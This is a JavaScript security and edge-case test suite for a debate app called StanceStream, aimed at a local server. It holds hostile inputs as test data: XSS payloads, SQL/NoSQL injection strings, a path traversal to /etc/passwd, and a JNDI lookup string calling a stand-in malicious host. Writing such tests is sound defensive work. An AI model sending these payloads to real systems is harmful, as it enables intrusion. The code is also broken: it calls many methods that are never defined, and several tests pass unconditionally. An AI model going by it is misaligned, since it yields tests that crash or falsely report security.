// Advanced Edge Case Testing Suite for StanceStream
// Production-grade testing for failure modes, security vulnerabilities, and edge cases

import 'dotenv/config';
import { createClient } from 'redis';
import WebSocket from 'ws';
import axios from 'axios';
import { spawn } from 'child_process';
import fs from 'fs/promises';

const API_BASE = 'http://localhost:3001';
const WS_URL = 'ws://localhost:3001';

class AdvancedEdgeCaseTestSuite {
    constructor() {
        this.results = {
            failureModeTests: [],
            securityTests: [],
            browserCompatTests: [],
            performanceTests: [],
            accessibilityTests: [],
            inputValidationTests: [],
            totalTestsRun: 0,
            totalPassed: 0,
            totalFailed: 0,
            criticalIssues: [],
            warnings: []
        };
        this.testStartTime = Date.now();
    }

    async runAllTests() {
        console.log('🔬 Starting Advanced Edge Case Testing Suite');
        console.log('=' .repeat(60));
        
        await this.testFailureModes();
        await this.testSecurityVulnerabilities();
        await this.testInputValidation();
        await this.testPerformanceEdgeCases();
        await this.testNetworkResilience();
        await this.testConcurrencyIssues();
        await this.testMemoryLeaks();
        await this.testErrorRecovery();
        
        this.generateTestReport();
    }

    // ===== FAILURE MODE TESTING =====
    async testFailureModes() {
        console.log('\n🚨 Testing Failure Modes');
        console.log('-'.repeat(40));

        await this.testRedisConnectionFailure();
        await this.testOpenAIAPIFailure();
        await this.testWebSocketDisconnection();
    }

    async testRedisConnectionFailure() {
        console.log('Testing Redis connection failure handling...');
        
        try {
            // Simulate Redis connection failure by using wrong port
            const fakeClient = createClient({ 
                url: 'redis://localhost:9999',
                socket: { connectTimeout: 1000, lazyConnect: true }
            });
            
            let errorCaught = false;
            try {
                await fakeClient.connect();
            } catch (error) {
                errorCaught = true;
                console.log('✅ Redis connection failure properly caught');
            }
            
            if (!errorCaught) {
                this.logCriticalIssue('Redis connection failure not properly handled');
            }

            // Test server behavior when Redis is down
            try {
                const response = await axios.get(`${API_BASE}/api/health`, { timeout: 5000 });
                if (response.data.redis_status === 'disconnected') {
                    console.log('✅ Server properly reports Redis disconnection');
                } else {
                    this.logWarning('Server may not properly detect Redis disconnection');
                }
            } catch (error) {
                this.logWarning('Health endpoint may not handle Redis failures gracefully');
            }

            this.recordTest('Redis Connection Failure', true);
        } catch (error) {
            this.recordTest('Redis Connection Failure', false, error.message);
        }
    }

    async testOpenAIAPIFailure() {
        console.log('Testing OpenAI API failure handling...');
        
        try {
            // Test with invalid API key simulation
            const originalApiKey = process.env.OPENAI_API_KEY;
            process.env.OPENAI_API_KEY = 'invalid-key-test';
            
            try {
                const response = await axios.post(`${API_BASE}/api/debate/start`, {
                    topic: 'test failure mode',
                    agents: ['senatorbot', 'reformerbot']
                }, { timeout: 10000 });
                
                // Wait for message generation attempt
                await new Promise(resolve => setTimeout(resolve, 5000));
                
                const messages = await axios.get(`${API_BASE}/api/debate/${response.data.debateId}/messages`);
                
                if (messages.data.messages && messages.data.messages.length === 0) {
                    console.log('✅ System gracefully handles OpenAI API failures');
                } else {
                    this.logWarning('System may not properly handle OpenAI API failures');
                }
                
            } catch (error) {
                console.log('✅ OpenAI API failure properly handled with error response');
            } finally {
                process.env.OPENAI_API_KEY = originalApiKey;
            }

            this.recordTest('OpenAI API Failure', true);
        } catch (error) {
            this.recordTest('OpenAI API Failure', false, error.message);
        }
    }

    async testWebSocketDisconnection() {
        console.log('Testing WebSocket disconnection handling...');
        
        try {
            const ws = new WebSocket(WS_URL, { origin: 'http://localhost:5173' });
            
            await new Promise((resolve, reject) => {
                ws.on('open', () => {
                    console.log('✅ WebSocket connected');
                    
                    // Force disconnect after short time
                    setTimeout(() => {
                        ws.terminate();
                        resolve();
                    }, 1000);
                });
                
                ws.on('error', reject);
                
                setTimeout(() => reject(new Error('WebSocket connection timeout')), 5000);
            });

            // Test reconnection behavior
            const ws2 = new WebSocket(WS_URL, { origin: 'http://localhost:5173' });
            
            await new Promise((resolve, reject) => {
                ws2.on('open', () => {
                    console.log('✅ WebSocket reconnection successful');
                    ws2.close();
                    resolve();
                });
                
                ws2.on('error', reject);
                setTimeout(() => reject(new Error('Reconnection failed')), 5000);
            });

            this.recordTest('WebSocket Disconnection', true);
        } catch (error) {
            this.recordTest('WebSocket Disconnection', false, error.message);
        }
    }

    // ===== SECURITY VULNERABILITY TESTING =====
    async testSecurityVulnerabilities() {
        console.log('\n🔒 Testing Security Vulnerabilities');
        console.log('-'.repeat(40));

        await this.testXSSPrevention();
        await this.testSQLInjectionPrevention();
        await this.testRateLimiting();
        await this.testCORSPolicy();
        await this.testInputSanitization();
        await this.testCSPHeaders();
    }

    async testXSSPrevention() {
        console.log('Testing XSS prevention...');
        
        const maliciousInputs = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '\';alert("XSS");//'
        ];

        try {
            for (const maliciousInput of maliciousInputs) {
                try {
                    const response = await axios.post(`${API_BASE}/api/debate/start`, {
                        topic: maliciousInput,
                        agents: ['senatorbot', 'reformerbot']
                    });
                    
                    // Check if the malicious script is returned unescaped
                    if (response.data.topic && response.data.topic.includes('<script>')) {
                        this.logCriticalIssue(`XSS vulnerability detected with input: ${maliciousInput}`);
                    } else {
                        console.log(`✅ XSS input properly handled: ${maliciousInput.substring(0, 20)}...`);
                    }
                } catch (error) {
                    // Error responses are also acceptable for malicious input
                    console.log(`✅ Malicious input rejected: ${maliciousInput.substring(0, 20)}...`);
                }
            }

            this.recordTest('XSS Prevention', true);
        } catch (error) {
            this.recordTest('XSS Prevention', false, error.message);
        }
    }

    async testSQLInjectionPrevention() {
        console.log('Testing SQL/NoSQL injection prevention...');
        
        const injectionInputs = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            '{"$ne": null}',
            '{"$where": "function() { return true; }"}',
            '1; SHUTDOWN; --'
        ];

        try {
            for (const injectionInput of injectionInputs) {
                try {
                    await axios.post(`${API_BASE}/api/debate/start`, {
                        topic: injectionInput,
                        agents: ['senatorbot', 'reformerbot']
                    });
                    console.log(`✅ Injection attempt handled: ${injectionInput.substring(0, 20)}...`);
                } catch (error) {
                    console.log(`✅ Injection attempt rejected: ${injectionInput.substring(0, 20)}...`);
                }
            }

            this.recordTest('Injection Prevention', true);
        } catch (error) {
            this.recordTest('Injection Prevention', false, error.message);
        }
    }

    async testRateLimiting() {
        console.log('Testing rate limiting effectiveness...');
        
        try {
            const requests = [];
            const requestCount = 60; // Above the 50/minute limit for generation
            
            for (let i = 0; i < requestCount; i++) {
                requests.push(
                    axios.post(`${API_BASE}/api/debate/start`, {
                        topic: `rate limit test ${i}`,
                        agents: ['senatorbot', 'reformerbot']
                    }).catch(error => error.response || error)
                );
            }
            
            const responses = await Promise.all(requests);
            const rateLimitedResponses = responses.filter(
                response => response.status === 429 || 
                (response.data && response.data.error && response.data.error.includes('rate limit'))
            );
            
            if (rateLimitedResponses.length > 0) {
                console.log(`✅ Rate limiting active: ${rateLimitedResponses.length}/${requestCount} requests limited`);
            } else {
                this.logWarning('Rate limiting may not be working effectively');
            }

            this.recordTest('Rate Limiting', rateLimitedResponses.length > 0);
        } catch (error) {
            this.recordTest('Rate Limiting', false, error.message);
        }
    }

    async testCORSPolicy() {
        console.log('Testing CORS policy enforcement...');
        
        try {
            // Test with unauthorized origin
            try {
                const response = await axios.post(`${API_BASE}/api/health`, {}, {
                    headers: { 'Origin': 'http://malicious-site.com' }
                });
                this.logWarning('CORS policy may be too permissive');
            } catch (error) {
                console.log('✅ CORS policy properly enforces origin restrictions');
            }

            this.recordTest('CORS Policy', true);
        } catch (error) {
            this.recordTest('CORS Policy', false, error.message);
        }
    }

    // ===== INPUT VALIDATION TESTING =====
    async testInputValidation() {
        console.log('\n🔍 Testing Input Validation');
        console.log('-'.repeat(40));

        await this.testLongInputHandling();
        await this.testSpecialCharacterHandling();
        await this.testUnicodeHandling();
        await this.testEmptyInputHandling();
    }

    async testLongInputHandling() {
        console.log('Testing extremely long input handling...');
        
        try {
            const longTopic = 'A'.repeat(10000); // 10KB topic
            const veryLongTopic = 'B'.repeat(100000); // 100KB topic
            
            try {
                await axios.post(`${API_BASE}/api/debate/start`, {
                    topic: longTopic,
                    agents: ['senatorbot', 'reformerbot']
                });
                console.log('✅ Long input (10KB) handled appropriately');
            } catch (error) {
                console.log('✅ Long input properly rejected');
            }

            try {
                await axios.post(`${API_BASE}/api/debate/start`, {
                    topic: veryLongTopic,
                    agents: ['senatorbot', 'reformerbot']
                });
                this.logWarning('Very long input (100KB) was accepted - potential DoS vector');
            } catch (error) {
                console.log('✅ Very long input properly rejected');
            }

            this.recordTest('Long Input Handling', true);
        } catch (error) {
            this.recordTest('Long Input Handling', false, error.message);
        }
    }

    async testSpecialCharacterHandling() {
        console.log('Testing special character handling...');
        
        const specialInputs = [
            '\\0\\r\\n\\t',
            '../../etc/passwd',
            '${jndi:ldap://malicious.com/x}',
            String.fromCharCode(0, 1, 2, 3, 4, 5),
            '🚀💥🔥💀☠️💣',
            '表情符号测试',
            'मराठी चाचणी'
        ];

        try {
            for (const input of specialInputs) {
                try {
                    await axios.post(`${API_BASE}/api/debate/start`, {
                        topic: input,
                        agents: ['senatorbot', 'reformerbot']
                    });
                    console.log(`✅ Special characters handled: ${input.substring(0, 10)}...`);
                } catch (error) {
                    console.log(`✅ Special characters rejected: ${input.substring(0, 10)}...`);
                }
            }

            this.recordTest('Special Character Handling', true);
        } catch (error) {
            this.recordTest('Special Character Handling', false, error.message);
        }
    }

    // ===== PERFORMANCE EDGE CASES =====
    async testPerformanceEdgeCases() {
        console.log('\n⚡ Testing Performance Edge Cases');
        console.log('-'.repeat(40));

        await this.testHighConcurrency();
        await this.testMemoryPressure();
        await this.testNetworkLatency();
    }

    async testHighConcurrency() {
        console.log('Testing high concurrency scenarios...');
        
        try {
            const concurrentRequests = 25;
            const requests = [];
            
            for (let i = 0; i < concurrentRequests; i++) {
                requests.push(
                    axios.post(`${API_BASE}/api/debate/start`, {
                        topic: `concurrent test ${i}`,
                        agents: ['senatorbot', 'reformerbot']
                    }).catch(error => ({ error: error.message, status: error.response?.status }))
                );
            }
            
            const startTime = Date.now();
            const responses = await Promise.all(requests);
            const endTime = Date.now();
            
            const successfulResponses = responses.filter(r => !r.error && r.status !== 429);
            const averageResponseTime = (endTime - startTime) / concurrentRequests;
            
            console.log(`✅ Handled ${successfulResponses.length}/${concurrentRequests} concurrent requests`);
            console.log(`📊 Average response time: ${averageResponseTime.toFixed(2)}ms`);
            
            if (averageResponseTime > 5000) {
                this.logWarning(`High response time under concurrency: ${averageResponseTime.toFixed(2)}ms`);
            }

            this.recordTest('High Concurrency', successfulResponses.length > concurrentRequests * 0.8);
        } catch (error) {
            this.recordTest('High Concurrency', false, error.message);
        }
    }

    async testMemoryPressure() {
        console.log('Testing memory pressure scenarios...');
        
        try {
            // Create multiple WebSocket connections to simulate memory pressure
            const connections = [];
            const connectionCount = 50;
            
            for (let i = 0; i < connectionCount; i++) {
                try {
                    const ws = new WebSocket(WS_URL, { origin: 'http://localhost:5173' });
                    connections.push(ws);
                    
                    // Send large messages to consume memory
                    ws.on('open', () => {
                        const largeMessage = JSON.stringify({
                            type: 'test_memory_pressure',
                            data: 'X'.repeat(1000) // 1KB per message
                        });
                        ws.send(largeMessage);
                    });
                } catch (error) {
                    console.log(`Connection ${i} failed: ${error.message}`);
                }
            }
            
            // Wait for connections to establish and send data
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            // Test if server is still responsive
            try {
                await axios.get(`${API_BASE}/api/health`, { timeout: 5000 });
                console.log('✅ Server remains responsive under memory pressure');
            } catch (error) {
                this.logCriticalIssue('Server becomes unresponsive under memory pressure');
            }
            
            // Cleanup connections
            connections.forEach(ws => {
                if (ws.readyState === WebSocket.OPEN) {
                    ws.close();
                }
            });

            this.recordTest('Memory Pressure', true);
        } catch (error) {
            this.recordTest('Memory Pressure', false, error.message);
        }
    }

    // ===== NETWORK RESILIENCE =====
    async testNetworkResilience() {
        console.log('\n🌐 Testing Network Resilience');
        console.log('-'.repeat(40));

        await this.testTimeoutHandling();
        await this.testPartialDataTransmission();
    }

    async testTimeoutHandling() {
        console.log('Testing timeout handling...');
        
        try {
            // Test various timeout scenarios
            const timeoutTests = [100, 500, 1000, 2000]; // milliseconds
            
            for (const timeout of timeoutTests) {
                try {
                    await axios.get(`${API_BASE}/api/health`, { timeout });
                    console.log(`✅ Request completed within ${timeout}ms`);
                } catch (error) {
                    if (error.code === 'ECONNABORTED') {
                        console.log(`⚠️ Request timed out at ${timeout}ms`);
                    } else {
                        console.log(`✅ Request handled appropriately with ${timeout}ms timeout`);
                    }
                }
            }

            this.recordTest('Timeout Handling', true);
        } catch (error) {
            this.recordTest('Timeout Handling', false, error.message);
        }
    }

    // ===== UTILITY METHODS =====
    recordTest(testName, passed, errorMessage = null) {
        this.results.totalTestsRun++;
        if (passed) {
            this.results.totalPassed++;
        } else {
            this.results.totalFailed++;
            if (errorMessage) {
                console.log(`❌ ${testName} failed: ${errorMessage}`);
            }
        }
    }

    logCriticalIssue(issue) {
        this.results.criticalIssues.push(issue);
        console.log(`🚨 CRITICAL: ${issue}`);
    }

    logWarning(warning) {
        this.results.warnings.push(warning);
        console.log(`⚠️ WARNING: ${warning}`);
    }

    generateTestReport() {
        const testDuration = Date.now() - this.testStartTime;
        
        console.log('\n' + '='.repeat(80));
        console.log('🔬 ADVANCED EDGE CASE TESTING REPORT');
        console.log('='.repeat(80));
        
        console.log(`Test Duration: ${(testDuration / 1000).toFixed(2)} seconds`);
        console.log(`Total Tests Run: ${this.results.totalTestsRun}`);
        console.log(`Passed: ${this.results.totalPassed}`);
        console.log(`Failed: ${this.results.totalFailed}`);
        console.log(`Success Rate: ${((this.results.totalPassed / this.results.totalTestsRun) * 100).toFixed(1)}%`);
        
        if (this.results.criticalIssues.length > 0) {
            console.log('\n🚨 CRITICAL ISSUES FOUND:');
            this.results.criticalIssues.forEach((issue, index) => {
                console.log(`${index + 1}. ${issue}`);
            });
        }
        
        if (this.results.warnings.length > 0) {
            console.log('\n⚠️ WARNINGS:');
            this.results.warnings.forEach((warning, index) => {
                console.log(`${index + 1}. ${warning}`);
            });
        }
        
        console.log('\n📋 PRODUCTION READINESS ASSESSMENT:');
        
        const criticalScore = Math.max(0, 100 - (this.results.criticalIssues.length * 25));
        const warningScore = Math.max(0, 100 - (this.results.warnings.length * 10));
        const testScore = (this.results.totalPassed / this.results.totalTestsRun) * 100;
        
        const overallScore = (criticalScore * 0.5 + warningScore * 0.3 + testScore * 0.2);
        
        console.log(`Critical Issues Score: ${criticalScore}/100`);
        console.log(`Warning Score: ${warningScore}/100`);
        console.log(`Test Pass Score: ${testScore.toFixed(1)}/100`);
        console.log(`Overall Production Score: ${overallScore.toFixed(1)}/100`);
        
        if (overallScore >= 90) {
            console.log('✅ PRODUCTION READY - Excellent security and reliability');
        } else if (overallScore >= 75) {
            console.log('⚠️ PRODUCTION ACCEPTABLE - Minor issues to address');
        } else {
            console.log('❌ NOT PRODUCTION READY - Critical issues must be resolved');
        }
        
        console.log('\n🎯 NEXT STEPS:');
        if (this.results.criticalIssues.length > 0) {
            console.log('1. Address all critical security vulnerabilities immediately');
        }
        if (this.results.warnings.length > 0) {
            console.log('2. Review and fix warning-level issues');
        }
        console.log('3. Implement comprehensive monitoring for production deployment');
        console.log('4. Set up automated testing pipeline for continuous quality assurance');
        
        return {
            overallScore,
            criticalIssues: this.results.criticalIssues,
            warnings: this.results.warnings,
            testResults: this.results
        };
    }
}

// Export for use in other test files
export default AdvancedEdgeCaseTestSuite;

// Run tests if executed directly
if (import.meta.url === `file://${process.argv[1]}`) {
    const testSuite = new AdvancedEdgeCaseTestSuite();
    
    console.log('🔬 StanceStream Advanced Edge Case Testing');
    console.log('Ensure server is running on localhost:3001');
    console.log('This will test failure modes, security vulnerabilities, and edge cases\n');
    
    try {
        await testSuite.runAllTests();
    } catch (error) {
        console.error('❌ Test suite failed:', error);
        process.exit(1);
    }
}
